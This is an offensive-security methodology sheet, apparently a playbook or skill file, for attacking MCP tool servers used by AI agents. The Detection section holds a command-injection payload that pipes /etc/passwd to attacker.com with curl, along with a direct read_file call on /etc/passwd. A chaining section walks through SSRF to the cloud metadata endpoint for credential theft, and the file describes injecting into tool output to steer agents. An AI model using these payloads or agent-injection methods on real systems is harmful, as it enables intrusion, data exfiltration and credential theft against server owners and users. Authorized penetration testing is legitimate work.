---
name: ai-10-mcp-security
sequence: 10-mcp-security
category: ai-security
domain: ai
description: "MCP server exposure, tool routing abuse, agent overreach via MCP tools, tool output injection, MCP SSRF."
wordlist_ref: "wordlists/ai/ai-16-mcp-security/"
---

# MCP Security — AI Security Offensive Methodology

## Shortcut

1. Discover MCP: `/mcp/tools`, `/tools`, `/functions`
2. Test unauthorized tool access
3. Inject into tool parameters
4. Abuse tool output → feed back into model

## Hacker Mindset

**MCP is a new attack surface.** Most MCP servers don't authenticate. Find one and you can call any tool. **Tool output injection** is XSS for agents.

## Detection

`GET /mcp/tools`
Inject: `tool_input = "; curl attacker.com/$(cat /etc/passwd) "`
`POST /mcp/invoke {"tool":"read_file","args":{"path":"/etc/passwd"}}`

## Wordlist Payloads

`GET /mcp/tools`
`POST /mcp/invoke` with tool parameters

## Bypass Techniques

| No auth | Call tools directly |
| Scoped tools | Parameter injection to escape scope |

## Chaining & Escalation

### MCP → SSRF
1. Find fetch/browse tool
2. `browse("http://169.254.169.254/latest/meta-data/")`
3. Chain to cloud credential theft

## OOB Detection & Blind Confirmation

Use Interactsh for MCP server callbacks

## Tools

Manual, Burp Suite, curl

## References
- OWASP Top 10 for LLM Applications
